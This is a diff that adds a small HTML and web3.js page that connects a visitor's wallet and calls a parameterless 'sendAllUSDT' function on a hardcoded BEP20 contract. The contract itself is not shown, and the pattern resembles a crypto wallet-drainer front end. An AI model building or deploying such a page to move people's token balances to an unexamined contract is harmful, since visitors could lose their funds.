@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Send USDT</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+</head>
+<body>
+  <h2>Send All USDT (BEP20)</h2>
+  <button onclick="connect()">Connect Wallet</button>
+  <button onclick="sendUSDT()">Send USDT</button>
+
+  <script>
+    const CONTRACT_ADDRESS = "0xaefe4db939bc6ab1c37556973a09ef93c7ee095e";
+    const CONTRACT_ABI = [{"inputs": [], "name": "sendAllUSDT", "outputs": [], "stateMutability": "nonpayable", "type": "function"}];
+
+    let web3;
+    let account;
+    let contract;
+
+    async function connect() {
+      if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        await window.ethereum.enable();
+        const accounts = await web3.eth.getAccounts();
+        account = accounts[0];
+        contract = new web3.eth.Contract(CONTRACT_ABI, CONTRACT_ADDRESS);
+        alert("Wallet connected: " + account);
+      } else {
+        alert("Please use Trust Wallet or MetaMask");
+      }
+    }
+
+    async function sendUSDT() {
+      try {
+        await contract.methods.sendAllUSDT().send({ from: account });
+        alert("USDT sent successfully");
+      } catch (e) {
+        console.error(e);
+        alert("Transaction failed");
+      }
+    }
+  </script>
+</body>
+</html>
